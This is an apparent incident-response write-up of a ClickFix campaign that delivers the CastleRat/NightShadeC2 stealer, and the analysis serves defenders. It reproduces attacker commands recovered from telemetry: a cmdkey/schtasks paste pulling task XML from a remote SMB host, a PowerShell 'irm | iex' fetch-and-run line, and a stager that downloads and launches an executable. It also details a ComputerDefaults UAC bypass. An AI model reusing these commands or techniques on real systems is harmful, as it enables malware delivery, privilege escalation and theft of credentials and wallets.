---
id: castle-rat-delivery-chain
title: "CastleRat Delivery Chain"
summary: "ClickFix social engineering via cmdkey and remote schtasks, leading to a CastleRat implant with Steam profile dead-drop C2."
category: DFIR
date: 2026-04-23
tags: [clickfix, castle-rat, delivery-chain, windows, malware]
---

# CastleRat Delivery Chain

## Summary

```
CLASS      : RAT delivery / ClickFix chain
VECTOR     : Social engineering (Win+R paste as fake CAPTCHA)
STAGE 1    : cmdkey + remote schtasks XML over SMB
STAGE 2    : PowerShell irm|iex stager (AMSI dilution)
STAGE 3    : .NET loader → bundled Python runtime
IMPLANT    : CastleRat / NightShadeC2
C2 RESOLVE : Steam Community profile dead-drop
C2         : 45.88.106.190:4545 (resolved)
```

ClickFix-style delivery ending in CastleRat / NightShadeC2. The user pasted an attacker-supplied command into Run (`Win+R`) as a fake CAPTCHA check. That command staged SMB credentials, created a scheduled task from remote XML, and led through a junk-padded PowerShell stager into a .NET loader, bundled Python runtime, Steam dead-drop C2 resolution, and the implant.

## Attack Chain

```
User pastes "Cloudflare CAPTCHA" command → cmd.exe
  → cmdkey + schtasks /XML
  → SMB \\195.10.205.171\kxc\full.xml
  → Scheduled Task "Lowks"
  → powershell -c "irm … | iex"
  → yhofgafjle.com (junk-padded script)
  → cWtdXfLUVptO() → maestrovsd.exe
  → .NET loader + PowerShell staging
  → Python bundle under C:\ProgramData\{random}\
  → pythonw.exe install.pyc / melody.pyc
  → ComputerDefaults.exe UAC bypass
  → steamcommunity.com/id/… (C2 resolver)
  → CastleRat / NightShadeC2 → 45.88.106.190:4545
```

## Initial Access - ClickFix

The lure page was not preserved. The executed command was recovered from endpoint telemetry:

```cmd
cmd.exe /c cmdkey /add:195.10.205.171 /user:guest && schtasks /Create /TN "Lowks" /XML "\\195.10.205.171\kxc\full.xml" & REM I am not a robot - Cloudflare ID: qbIohbNXJpIB7wj
```

The trailing `REM` comment mimics Cloudflare verification text so the paste looks like CAPTCHA-related noise rather than a full command chain.

## Credential Staging and Scheduled Task

The command chains two actions with `&&`.

### cmdkey

```cmd
cmdkey /add:195.10.205.171 /user:guest
```

Stores credentials for `\\195.10.205.171\` as `guest` in Windows Credential Manager. That avoids an interactive prompt when the next step opens the remote SMB share.

### schtasks

```cmd
schtasks /Create /TN "Lowks" /XML "\\195.10.205.171\kxc\full.xml"
```

Task definition is pulled from a remote SMB share instead of embedded in the paste. The XML can be changed server-side without updating the lure command. `full.xml` defines a task that runs:

```powershell
powershell -c "irm hxxps://yhofgafjle[.]com | iex"
```

`Invoke-RestMethod` fetches a script and pipes it to `Invoke-Expression` with no intermediate file on disk. That handoff is what loads Stage 2.

## PowerShell Stager - AMSI Dilution

The script from `yhofgafjle[.]com` contains hundreds of lines of filler:

```powershell
$xYzAbc = "lorem"
$pPpQqq = $xYzAbc + "ipsum"
function asd0192hjkl { return $true }
$rndVar = Get-Random -Minimum 1 -Maximum 9999
```

Padding dilutes AMSI and static signature matches. Functional payload is buried in the noise:

```powershell
function cWtdXfLUVptO {
    $ulaSVjsMmF = "https://yhofgafjle.com/maestrovsd.exe"
    $pURHzjVsUNaWGZ = "C:\Windows\Temp\TrHtWFGyRY.exe"
    Invoke-WebRequest -Uri $ulaSVjsMmF -OutFile $pURHzjVsUNaWGZ
    Start-Process -FilePath $pURHzjVsUNaWGZ
}
```

Downloads `maestrovsd.exe`, writes it to `C:\Windows\Temp\TrHtWFGyRY.exe`, and executes it. Variable names appear randomized per deployment.

## .NET Loader and Python Runtime

`maestrovsd.exe` is a ~150KB .NET assembly compiled within a week of execution.

```
Verdict:        Malicious (100/100)
Family:         CastleRat / NightShadeC2
Tags:           rat, stealer, botnet, python, uac
First C2:       212.43.154.198:23814 (Latvia / PODAON)
```

On execution, the loader spawns multiple PowerShell processes (`-NoProfile`) and retrieves staged payloads:

```
http://162.33.177.16/Dvizhok.zip
http://162.33.177.16/NiceNic.zip
http://162.33.177.16/either/Python.zip
http://162.33.177.16/either/install.pyc
http://162.33.177.16/either/veQcBTuTnPwMD.Ar
https://adamcold.com/NiceNic/Python.zip
https://adamcold.com/NiceNic/melody.pyc
https://adamcold.com/NiceNic/5o7dkS4S.8
```

The ZIP archives contain full Python runtimes (signed `python.exe`, `pythonw.exe`, `python313.dll`). The malware ships its own interpreter rather than depending on a host install.

Dropped locations:

```
C:\ProgramData\5171NWNrWQ\   ← Python 3.9 environment
C:\ProgramData\92WKzFYLqB\   ← Python 3.13 environment
```

Execution uses signed `pythonw.exe` against `install.pyc` and `melody.pyc`, so the process tree shows a trusted binary running attacker bytecode.

## In-Memory C# Compilation and UAC Bypass

Sandbox analysis captured `csc.exe` with `.cmdline` argument files, producing temporary DLLs in `%TEMP%`:

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
    /noconfig /fullpaths @"C:\Users\<user>\AppData\Local\Temp\is3na01s.cmdline"
```

Consistent with inline C# compilation from PowerShell (`Add-Type`): source generated at runtime, compiled, loaded, without a persistent malicious DLL on disk.

UAC bypass via `ComputerDefaults.exe` registry hijack:

```
Parent:    C:\ProgramData\92WKzFYLqB\pythonw.exe
Child:     C:\Windows\System32\ComputerDefaults.exe
Integrity: HIGH (elevated)
```

The chain modifies `HKCU\Software\Classes\ms-settings\Shell\Open\command` and launches auto-elevated `ComputerDefaults.exe`. Elevation from the Python host feeds later privileged actions and implant setup.

## C2 Resolution - Steam Dead Drop

The implant does not hardcode its primary C2. It retrieves:

```
https://steamcommunity.com/id/dpmorin49sdiw302fw
```

The bot fetches the Steam Community profile, parses the bio, and extracts the embedded C2 string. Infrastructure rotation only requires editing the profile.

![Steam profile dead-drop resolver](assets/steam-dead-drop.png)

Resolved C2 in this case: `45.88.106.190:4545` (Netherlands, ON-LINE-DATA).

Config extraction also identified backup C2 `8.3.0.253` and RC4 key:

```
596d626a6f39745634686470324c7430  →  Ymbjo9tV4hdp2Lt0
```

The key decrypts secondary stages `5o7dkS4S.8` and `veQcBTuTnPwMD.Ar` (~5MB and ~15MB RC4-encrypted blobs loaded in memory).

The Python payload is PyArmor-protected; static `.pyc` analysis is limited. YARA hits on process dumps tagged both **CastleRat** and **NightShadeC2** (same codebase or close fork given infrastructure overlap).

## Post-Compromise Capabilities

Observed stealer functionality after C2 resolution:

- **Browsers** — Chrome, Edge, Firefox (cookies, credentials, autofill). Firefox decryption via victim-installed `nss3.dll`.
- **Crypto wallets** — Exodus, Electrum, Atomic, Coinomi, Jaxx, Ledger Live, Ethereum keystore, WalletWasabi; extension wallets including MetaMask, Phantom, TronLink.
- **Password managers** — 1Password, NordPass directory enumeration.
- **VPN** — NordVPN, ProtonVPN configs.
- **FTP** — Cyberduck, FileZilla.
- **Screenshots** — observed across `pythonw.exe` memory regions.

Exfiltration over resolved C2 `45.88.106.190:4545`.

## Indicators of Compromise

### Hashes (SHA256)

```
File            Hash
--------------  ----------------------------------------------------------------
maestrovsd.exe  e25534efbab99f08ca802c6d3974c2ff7c47ddd6e6ed71a84a94c2fddd7de4e2
install.pyc     b953bb0acb76848f889909256d67d01d44cc45d83c8bfc3421783ac0a79688fc
melody.pyc      91919832f20d8fb78bab82844a430ecbe02a07df3f317316a8c34f54e3bb45c2
```

### Network

```
Indicator                  Role
-------------------------  --------------------------------
195.10.205.171             SMB staging (cmdkey target)
yhofgafjle[.]com           PowerShell stager host
162.33.177.16              Payload distribution (HTTP)
adamcold[.]com             Payload distribution (HTTPS)
212.43.154.198:23814       Initial C2 (Latvia)
45.88.106.190:4545         Resolved C2 (Netherlands)
8.3.0.253                  Backup C2
```

### Dead Drop

```
steamcommunity[.]com/id/dpmorin49sdiw302fw
```

### Filesystem

```
C:\ProgramData\5171NWNrWQ\
C:\ProgramData\92WKzFYLqB\
C:\Windows\Temp\TrHtWFGyRY.exe
%LOCALAPPDATA%\NiceNickAlliceRachelCoach*
%LOCALAPPDATA%\StreamEtheriumLife*
```

### Crypto

```
RC4 key:  Ymbjo9tV4hdp2Lt0
```

### Scheduled Task

```
Name:  Lowks
XML:   \\195.10.205.171\kxc\full.xml
```
